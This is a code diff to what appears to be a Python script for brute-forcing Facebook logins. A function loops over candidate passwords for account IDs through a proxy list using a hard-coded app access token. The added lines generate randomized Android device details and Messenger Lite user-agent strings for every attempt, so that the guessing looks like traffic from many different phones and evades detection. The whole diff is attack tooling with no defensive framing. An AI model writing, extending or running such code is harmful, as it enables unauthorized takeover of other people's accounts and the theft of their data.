@@ -71,6 +71,12 @@ except Exception as e:
   print(' server error')
 proxsi=open('socksku.txt','r').read().splitlines()
 
+android_versions = ['9', '12.0', '5.0', '10', '11.1.1', '12', '4.2.2', '6.0']
+models = ['L-03K', 'Nexus 5X', 'RMX3350', 'Nexus 6P', 'RMX3516', 'Infinix X688B', 'vivo 1850', 'Nexus 7', 'HUAWEI G730-T00', 'PE-TL10']
+build_numbers = ['PKQ1.', 'N4F26T.', 'PPR1.', '0PM5.', 'PPR1.', 'QP1A.', 'OPM1.', 'LMY47V.', 'HuaweiG730-T00.', 'HuaweiPE-TL10.']
+fb_versions = [''.join(random.choices(string.digits, k=9)) for _ in range(10)]
+densities = ['2.54375', '2.0', '2.0', '2.0', '3.0', '2.0', '3.0', '3.0', '3.0', '3.0']
+
 def ua_api():
     vers = random.randrange(6,13)
     verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
@@ -1137,6 +1143,11 @@ def m4(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
+            android_version = random.choice(android_versions)
+            model = random.choice(models)
+            build_number = random.choice(build_numbers) + ''.join(random.choices(string.digits, k=6)) + '.001'
+            fb_version = random.choice(fb_versions)
+            density = random.choice(densities)
             device_id = str(uuid.uuid4())
             adid = str(uuid.uuid4())
             accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
@@ -1180,7 +1191,7 @@ def m4(idf,pwv):
             'X-FB-Connection-Type':'unknown',
             'X-FB-connection-quality':'EXCELLENT',
             "X-Tigon-Is-Retry": "False",
-            'User-Agent':f"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320G Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 UCBrowser/11.5.2.1188 (UCMini) Mobile",
+            'User-Agent': f"Dalvik/2.1.0 (Android {android_version}; {model} Build/{build_number}) [FBAN/MessengerLite;FBAV/{fb_version}.0.0.2{''.join(random.choices(string.digits, k=3))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{''.join(random.choices(string.digits, k=9))};FBCR/{random.choice(['Airtel', 'AXIS', 'IndosatOoredoo', 'null'])};FBMF/{random.choice(['LGE', 'Vision', 'Realme', 'Facebook', 'vivo', 'Vision', 'FONF'])};FBBD/{random.choice(['lge', 'Vision', 'Realme', 'vivo', 'Vision', 'Vision', 'FBBD'])};FBDV/{model};FBSV/{random.choice(['9', '12', '8', '10', '11.1.1'])};FBCA/{random.choice(['arm64-v8a:null', 'arm64-v8a:null', 'arm64-v8a:null', 'armeabi-v7a:armeabi', 'armeabi-v7a:armeabi'])};FBDM/"+"{{density={density},width={random.choice(['720', '1080'])},height={random.choice(['1600', '1412', '1920'])}}};]",
             "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
             'Accept-Encoding':'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
